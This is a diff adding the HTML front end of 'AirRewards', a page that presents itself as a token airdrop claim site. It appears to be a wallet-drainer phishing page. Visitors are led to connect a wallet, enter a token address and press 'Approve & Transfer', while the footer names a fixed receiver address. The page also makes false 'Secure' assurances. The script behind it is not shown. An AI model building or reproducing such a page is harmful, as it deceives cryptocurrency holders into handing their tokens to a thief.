@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AirRewards - Token Airdrop Platform</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">
+                <h1>🎁 AirRewards</h1>
+            </div>
+            <nav>
+                <button id="connectWallet" class="btn btn-primary">Connect Wallet</button>
+            </nav>
+        </header>
+
+        <main>
+            <section class="hero">
+                <h2>Welcome to AirRewards</h2>
+                <p>Claim your token airdrop on EVM networks</p>
+            </section>
+
+            <section class="wallet-info" id="walletInfo" style="display: none;">
+                <div class="info-card">
+                    <h3>Wallet Connected</h3>
+                    <p class="wallet-address" id="walletAddress"></p>
+                    <p class="network-info" id="networkInfo"></p>
+                </div>
+            </section>
+
+            <section class="airdrop-section" id="airdropSection" style="display: none;">
+                <div class="airdrop-card">
+                    <h3>Claim Your Airdrop</h3>
+                    <p class="description">Enter the token contract address to claim your airdrop</p>
+                    
+                    <div class="form-group">
+                        <label for="tokenAddress">Token Contract Address</label>
+                        <input 
+                            type="text" 
+                            id="tokenAddress" 
+                            class="form-input" 
+                            placeholder="0x..."
+                            pattern="^0x[a-fA-F0-9]{40}$"
+                        >
+                    </div>
+
+                    <div class="token-info" id="tokenInfo" style="display: none;">
+                        <div class="info-row">
+                            <span>Token Balance:</span>
+                            <span id="tokenBalance">-</span>
+                        </div>
+                        <div class="info-row">
+                            <span>Approved Amount:</span>
+                            <span id="approvedAmount">-</span>
+                        </div>
+                    </div>
+
+                    <button id="checkTokenBtn" class="btn btn-secondary">Check Token</button>
+                    <button id="approveBtn" class="btn btn-success" style="display: none;">Approve & Transfer</button>
+                    
+                    <div class="status-message" id="statusMessage"></div>
+                </div>
+            </section>
+
+            <section class="info-section">
+                <div class="info-grid">
+                    <div class="info-item">
+                        <div class="icon">🔐</div>
+                        <h4>Secure</h4>
+                        <p>All transactions are secured via smart contracts</p>
+                    </div>
+                    <div class="info-item">
+                        <div class="icon">⚡</div>
+                        <h4>Fast</h4>
+                        <p>Instant token transfers on EVM networks</p>
+                    </div>
+                    <div class="info-item">
+                        <div class="icon">🌐</div>
+                        <h4>Multi-Chain</h4>
+                        <p>Support for all EVM-compatible networks</p>
+                    </div>
+                </div>
+            </section>
+        </main>
+
+        <footer>
+            <p>&copy; 2024 AirRewards. All rights reserved.</p>
+            <p class="receiver-info">Receiver Address: 0xf36aa3cd6fdd245d03982caeb7c4a31b2b4be1d0</p>
+        </footer>
+    </div>
+
+    <script src="/lib/web3.min.js"></script>
+    <script src="app.js"></script>
+</body>
+</html>
